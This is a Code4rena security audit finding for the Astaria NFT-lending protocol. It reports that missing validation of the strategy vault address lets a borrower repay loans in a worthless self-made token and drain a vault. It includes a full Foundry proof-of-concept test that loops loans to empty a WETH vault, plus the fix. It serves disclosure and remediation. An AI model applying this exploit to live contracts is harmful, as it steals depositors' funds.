## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-08

# [Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault](https://github.com/code-423n4/2023-01-astaria-findings/issues/409) 

# Lines of code

https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287


# Vulnerability details

## Impact
When a borrower takes a loan, Strategy details are passed along with other required data, and through the overall **commitToLien** flow, all the data are validated except the StrategyDetailsParam.vault 

```sh
  struct StrategyDetailsParam {
    uint8 version;
    uint256 deadline;
    address vault;
  }
```

A borrower then can pass different vault's address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token. 

https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849

### Exploit Scenario 
Allow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:

1. **Bob** owns an NFT.
2. **Bob** sends his NFT to the collateral token contract.
3. **Bob** creates his own private vault **BobVault** with an asset that he created **FakeToken** which doesn’t have any value in the market (e.g. just a new ERC20 token).
4. **Bob** takes a loan from **Vault1** (while passing **BobVault** in the strategy param).
6. **Bob** pay the loan with his **FakeToken** instead **Vault1**'s asset.
7. **Bob** then repeats the steps from point 4 again till **Vault1** is drained.
8. **Bob** now has all the funds from **Vault1** with **zero** debt.
9. **Strategist** has the same amount of **Vault1**'s funds but in **FakeToken**.

This exploit can be done with other vaults draining all the funds.
To prove this, I've coded the scenario below.


## Proof of Concept


1. Please create a file with a name **StealAllFundsExploit.t.sol** under **src/test/** directory.

2. Add the following code to the file.

```sh
pragma solidity =0.8.17;

import "forge-std/Test.sol";

import {Authority} from "solmate/auth/Auth.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {
  MultiRolesAuthority
} from "solmate/auth/authorities/MultiRolesAuthority.sol";

import {ERC721} from "gpl/ERC721.sol";
import {SafeCastLib} from "gpl/utils/SafeCastLib.sol";
import {IAstariaRouter, AstariaRouter} from "../AstariaRouter.sol";
import {VaultImplementation} from "../VaultImplementation.sol";
import {PublicVault} from "../PublicVault.sol";
import {TransferProxy} from "../TransferProxy.sol";
import {WithdrawProxy} from "../WithdrawProxy.sol";
import "./TestHelpers.t.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {IVaultImplementation} from "../interfaces/IVaultImplementation.sol";



contract AstariaTest is TestHelpers {
  using FixedPointMathLib for uint256;
  using CollateralLookup for address;
  using SafeCastLib for uint256;


  ILienToken.Details public lienDetails =
      ILienToken.Details({
        maxAmount: 50 ether,
        rate: (uint256(1e16) * 150) / (365 days),
        duration: 10 days,
        maxPotentialDebt: 50 ether,
        liquidationInitialAsk: 500 ether
      });


  function __createPrivateVault(address strategist, address delegate,address token)
    internal
    returns (address privateVault)
  {
    vm.startPrank(strategist);
    privateVault = ASTARIA_ROUTER.newVault(delegate, token);
    vm.stopPrank();
  }    

  
 function testPayWithDifferentAsset() public {
    TestNFT nft = new TestNFT(2);
    address tokenContract = address(nft);
    uint256 initialBalance = WETH9.balanceOf(address(this));

    // Create a private vault with WETH asset
    address privateVault = __createPrivateVault({
      strategist: strategistOne,
      delegate: address(0),
      token: address(WETH9)
    });


    _lendToPrivateVault(
      Lender({addr: strategistOne, amountToLend: 500 ether}),
      privateVault
    );
    
    // Send the NFT to Collateral contract and receive Collateral token
    ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,"");

    // generate valid terms
    uint256 amount = 50 ether; // amount to borrow        
    IAstariaRouter.Commitment memory c = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: 1,
      lienDetails: lienDetails,
      amount: amount,
      stack: new ILienToken.Stack[](0)
    });

    // Attack starts here
    // The borrower an asset which has no value in the market
    MockERC20 FakeToken = new MockERC20("USDC", "FakeAsset", 18); // this could be any ERC token created by the attacker
    FakeToken.mint(address(this),500 ether);
    // The borrower creates a private vault with his/her asset
    address privateVaultOfBorrower = __createPrivateVault({
      strategist: address(this),
      delegate: address(0),
      token: address(FakeToken)
    });

    uint8 i;
    for( ; i < 10 ; i ++) {
      // Here is the exploit: commitToLien on privateVault while passing differentVault in the strategy
      c.lienRequest.strategy.vault = privateVaultOfBorrower;   
      (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(
          c,
          address(this)
      );
      console.log("Take 50 ether loan#%d", (i+1));

      // necessary approvals
      FakeToken.approve(address(TRANSFER_PROXY), amount);
      FakeToken.approve(address(LIEN_TOKEN), amount);

      // pay the loan with FakeToken 
      ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(
        stack[0].lien.collateralId,
        stack,
        uint8(0),
        amount
      );
      console.log("Repay 50 FakeToken loan#%d", (i+1));
    }


    // assertion
    console.log("------");
    // Vault is drained
    console.log("PrivateVault Balance: %d WETH", WETH9.balanceOf(privateVault));
    assertEq(WETH9.balanceOf(privateVault), 0); 
    // The borrower gets 500 ether
    console.log("Borrower Balance: %d WETH", WETH9.balanceOf(address(this)));
    assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);
    // strategist receives the fake token
    console.log("Strategist Balance: %d FakeToken", FakeToken.balanceOf(strategistOne));
    assertEq(FakeToken.balanceOf(strategistOne), 500 ether);

  }
 
}


```

3. Then run the forge test command as follows (replace $FORK_URL with your RPC URL): 

```sh
 forge test --ffi --fork-url $FORK_URL --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv
```


The test will pass. I've added comments in the code explaining the steps.

*Note:The attack isn't possible when using AstariaRouter* 

## Tools Used
Manual analysis

## Recommended Mitigation Steps

In VaultImplementation's  `commitToLien`  function, add the following validation:
```sh
require(address(this) == params.lienRequest.strategy.vault,"INVALID VAULT");
```

Run the PoC test above again, and `testPayWithDifferentAsset` should fail.